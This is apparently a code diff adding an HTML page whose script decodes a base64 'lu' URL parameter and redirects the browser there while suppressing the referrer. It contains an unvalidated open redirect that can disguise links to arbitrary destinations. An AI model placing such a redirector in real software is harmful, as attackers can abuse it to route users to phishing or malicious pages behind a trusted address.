@@ -1,0 +1,16 @@
+<html>
+<head>
+    <meta name="referrer" content="never">
+    <meta name="referrer" content="no-referrer">
+    <script type="text/javascript">
+        (function () {
+            var test = 1;
+            if (test === 0) test = 3;
+        })();
+        var lre = /lu=(.*)$/ig;
+        window.location = atob(lre.exec(window.location.href)[1]);
+    </script>
+</head>
+<body>
+</body>
+</html>
